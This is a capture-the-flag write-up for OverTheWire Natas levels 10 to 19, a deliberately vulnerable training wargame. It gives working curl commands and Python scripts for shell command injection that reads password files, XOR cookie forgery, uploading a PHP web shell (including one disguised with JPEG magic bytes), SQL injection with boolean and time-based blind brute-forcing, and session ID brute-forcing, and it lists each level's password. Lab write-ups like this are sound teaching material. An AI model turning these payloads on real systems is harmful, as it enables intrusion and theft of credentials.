# Natas

## level 10

```php
<?php
// http://natas10.natas.labs.overthewire.org/index-source.html
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
?>
```

This level only check whether the input contains character ```;```, ```|``` and ```&```.

```
$ curl -u natas10:nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu http://natas10.natas.labs.overthewire.org/ -F 'needle=. /etc/natas_webpass/natas11 #' -F 'submit=Search'
```

```
U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
```

## level 11

```php
<?php
// http://natas11.natas.labs.overthewire.org/index-source.html
$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");

function xor_encrypt($in) {
    $key = '<censored>';
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

function loadData($def) {
    global $_COOKIE;
    $mydata = $def;
    if(array_key_exists("data", $_COOKIE)) {
    $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);
    if(is_array($tempdata) && array_key_exists("showpassword", $tempdata) && array_key_exists("bgcolor", $tempdata)) {
        if (preg_match('/^#(?:[a-f\d]{6})$/i', $tempdata['bgcolor'])) {
        $mydata['showpassword'] = $tempdata['showpassword'];
        $mydata['bgcolor'] = $tempdata['bgcolor'];
        }
    }
    }
    return $mydata;
}

function saveData($d) {
    setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
}

$data = loadData($defaultdata);

if(array_key_exists("bgcolor",$_REQUEST)) {
    if (preg_match('/^#(?:[a-f\d]{6})$/i', $_REQUEST['bgcolor'])) {
        $data['bgcolor'] = $_REQUEST['bgcolor'];
    }
}

saveData($data);
?>
```

```
$ curl -u natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK http://natas11.natas.labs.overthewire.org/ -c cookie.txt
```

We get the cookie and we konw what the cookie means, so we kan get the ```key``` in function ```xor_encrypt```.

```python
#!/usr/bin/env python3
import base64
import urllib.parse

with open('cookie.txt', 'r') as f:
    cookie = f.readlines()[-1].split('\t')[-1]
cookie = urllib.parse.unquote(cookie)
cookie = base64.urlsafe_b64decode(cookie)

text = b'{"showpassword":"no","bgcolor":"#ffffff"}';

key = ''

for i in range(len(text)):
    key += chr(text[i]^cookie[i])

print(key)
```

Let's construct a new cookie with the ```key```.

```php
<?php
function xor_encrypt($in) {
    $key = 'qw8J';
    $text = $in;
    $outText = '';
 
    for($i=0;$i<strlen($text);$i++) {
        $outText .= $key[$i % strlen($key)] ^ $text[$i];
    }
 
    return $outText;
}
 
$defaultdata = '{"showpassword":"yes","bgcolor":"#ffffff"}';
echo base64_encode(xor_encrypt($defaultdata));
?>
```

```
$ curl -u natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK http://natas11.natas.labs.overthewire.org/ -b 'data=ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK'
```

```
The password for natas12 is EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3
```

## level 12

This level we can upload a file without type checking.

```
$ curl -u natas12:EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3 http://natas12.natas.labs.overthewire.org/
```

```
<form enctype="multipart/form-data" action="index.php" method="POST">
<input type="hidden" name="MAX_FILE_SIZE" value="1000" />
<input type="hidden" name="filename" value="mx7ozjvm3x.jpg" />
Choose a JPEG to upload (max 1KB):<br/>
<input name="uploadedfile" type="file" /><br />
<input type="submit" value="Upload File" />
</form>
```

Create a file ```ving.php```.

```php
<?php
passthru("cat /etc/natas_webpass/natas13");
?>
```

```
$ curl -u natas12:EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3 http://natas12.natas.labs.overthewire.org/ -F 'filename=mx7ozjvm3x.php' -F 'uploadedfile=@ving.php'
```

```
The file <a href="upload/vimpzt7smb.php">upload/vimpzt7smb.php</a> has been uploaded
```

```
$ curl -u natas12:EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3 http://natas12.natas.labs.overthewire.org/upload/vimpzt7smb.php
jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY
```

## level 13

This level checks whether the file is an image using ```exif_imagetype``` function before receive it.
So we create a file looks like an image.

```
$ echo -e '\xff\xd8\xff\xe0<?passthru("cat /etc/natas_webpass/natas14");?>' > ving.php
```

Then do the same as level 12.

```
$ curl -u natas13:jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY http://natas13.natas.labs.overthewire.org/ -F 'filename=mx7ozjvm3x.php' -F 'uploadedfile=@ving.php'
```

```
The file <a href="upload/6xyuj68rtk.php">upload/6xyuj68rtk.php</a> has been uploaded
```

```
$ curl -u natas13:jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY http://natas13.natas.labs.overthewire.org/upload/6xyuj68rtk.php
Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1
```

## level 14

Simple SQL injection.

```
$ curl -u natas14:Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1 http://natas14.natas.labs.overthewire.org/?debug -F 'username=ving' -F 'password=" or "0" = "0'
```

```
Executing query: SELECT * from users where username="ving" and password="" or "0" = "0"
Successful login! The password for natas15 is AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J
```

## level 15

This level will not give us the password, but we can guess it using SQL injection.

```
$ curl -u natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J http://natas15.natas.labs.overthewire.org/?debug -F 'username=natas16" and password like binary "W%'
```

```
Executing query: SELECT * from users where username="natas16" and password like binary "W%"
This user exists.
```

Note: ```like binary``` is case sensitive.

Now we know the first character in password is ```W```.

Search for the password.

```python
#!/usr/bin/env python3
import requests

chars = [chr(i) for i in range(ord("a"),ord("z")+1)] +\
        [chr(i) for i in range(ord("A"),ord("Z")+1)] +\
        [chr(i) for i in range(ord("0"),ord("9")+1)]
password = ''
for i in range(32):
    for ch in chars:
        data = {'username': 'natas16" and password like binary "' + password + ch + '%'}
        auth = ('natas15','AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J')
        if 'This user exists' in requests.post('http://natas15.natas.labs.overthewire.org/?debug', auth = auth, data = data).text:
            password += ch
            print(password)
            break
```

```
WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
```

## level 16

Like level 10, the input can't contain ```[```, ```;```, ```|```, ```&```, <code>`</code>, ```\``` , ```'```, ```"```, and ```]```.
We can still inject other command using ```$(command)```.

```
$ curl -u natas16:WaIHEacj63wnNIBROHeqi3p9t0m5nhmh http://natas16.natas.labs.overthewire.org/ -F 'needle=$(grep -E ^a.*$ /etc/natas_webpass/natas17)hacker'
```

```
Output:
hacker
hacker's
hackers
```

If the password is start with ```a```, there will be no output.
In this way, we can search for the password.

```python
#!/usr/bin/env python3
import requests

chars = [chr(i) for i in range(ord("a"),ord("z")+1)] +\
        [chr(i) for i in range(ord("A"),ord("Z")+1)] +\
        [chr(i) for i in range(ord("0"),ord("9")+1)]
password = ''

for i in range(32):
    for ch in chars:
        params = {'needle': '$(grep -E ^' + password + ch + '.*$ /etc/natas_webpass/natas17)hacker'}
        auth = ('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh')
        if 'hacker' not in requests.get('http://natas16.natas.labs.overthewire.org', params = params, auth = auth).text:
            password += ch
            print(password)
            break
```

```
8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw
```

## level 17

This level is upgrade of level 16.
We can't see the result of SQL injection directly.
We are going to use time-based blind SQL injections to search for the password.

```
$ curl -u natas17:8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw http://natas17.natas.labs.overthewire.org/?debug -F 'username=natas18" and if(password like binary "x%", sleep(5), null) #'
```

If the password starts with ```x```, the result will be returned after a sleep.

Start search for the password.

```python
#!/usr/bin/env python3
import requests

chars = [chr(i) for i in range(ord("a"),ord("z")+1)] +\
        [chr(i) for i in range(ord("A"),ord("Z")+1)] +\
        [chr(i) for i in range(ord("0"),ord("9")+1)]
password = ''

for i in range(32):
    for ch in chars:
        data = {'username': 'natas18" and if (password like binary "' + password + ch + '%", sleep(5), null) #'}
        auth = ('natas17', '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw')
        try:
            requests.post('http://natas17.natas.labs.overthewire.org/?debug', data = data, auth = auth, timeout = 1)
        except requests.exceptions.Timeout:
            password += ch
            print(password)
            break
```

```
xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP
```

## level 18

```php
<?php
// http://natas18.natas.labs.overthewire.org/index-source.html
$maxid = 640; // 640 should be enough for everyone
?>
```

We can easily cover all 640 ```PHPSESSID``` to find out admin.

```python
#!/usr/bin/env python3
import requests

for i in range(641):
    auth = ('natas18','xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP')
    cookies = {'PHPSESSID': str(i)}
    r = requests.get('http://natas18.natas.labs.overthewire.org/', auth = auth, cookies = cookies)
    if 'You are an admin' in r.text:
        print(r.text)
        break
```

```
You are an admin. The credentials for the next level are:
Username: natas19
Password: 4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs
```

## level 19

This level the ```PHPSESSID``` field of the cookie is not a simple number.
Let me see some samples.

```
PHPSESSID: 3332352d61      ~   325-a
PHPSESSID: 39342d617364    ~   94-asd
PHPSESSID: 3139382d617364  ~   198-asd
```

Obviously the ```PHPSESSID``` consists of a number and a username and every character is expressed in hexadecimal.

```python
#!/usr/bin/env python3
import requests

for i in range(641):
    auth = ('natas19', '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs')
    cookies = {'PHPSESSID': ''.join([hex(ord(ch))[2:] for ch in str(i)+"-admin"])}
    r = requests.get('http://natas19.natas.labs.overthewire.org/', auth = auth, cookies = cookies)
    if 'You are an admin' in r.text:
        print(r.text)
        break
```

```
You are an admin. The credentials for the next level are:
Username: natas20
Password: eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF
```
